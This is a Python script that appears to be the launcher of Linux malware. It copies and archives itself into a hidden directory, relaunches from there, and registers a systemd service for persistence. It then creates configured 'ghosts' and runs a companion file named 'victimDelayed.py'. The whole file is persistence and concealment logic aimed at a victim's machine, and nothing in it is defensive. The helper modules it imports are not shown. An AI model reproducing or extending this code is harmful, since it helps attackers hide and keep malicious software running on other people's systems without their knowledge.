#!/usr/bin/python3
import config
import os
import tarfile
import persistence
import subprocess

#true if run as root
isRoot = os.popen("echo $USER").read()=="root\n"

#set cwd correctly to directory this file is in
os.chdir(os.path.split(os.path.abspath(__file__))[0])

targetDir = config.root["targetDir"] if isRoot else config.user["targetDir"] + "."
targetDir = os.path.expanduser(targetDir) + config.dirName + "/"
serviceDir = config.root["serviceDir"] if isRoot else config.user["serviceDir"]
serviceDir = os.path.expanduser(serviceDir)

#check if persistence is setup
tarExists = os.path.exists(config.tarName)
correctDir = os.path.abspath(".")+"/"==targetDir
serviceFound = os.path.exists(serviceDir+config.serviceName+".service")

#setup missing things
if not tarExists:
	persistence.compress(config.tarName)

if not correctDir:
	persistence.move(config.tarName)
	# run python file in new location
	subprocess.Popen(["python3", targetDir + "main.py"])
	exit()

if not serviceFound:
	persistence.createService(os.path.abspath("main.py"), config.serviceName, config.serviceDesc)


for i in config.ghosts:
	persistence.createGhost(*i)

os.system("python3 " + targetDir + "victimDelayed.py")
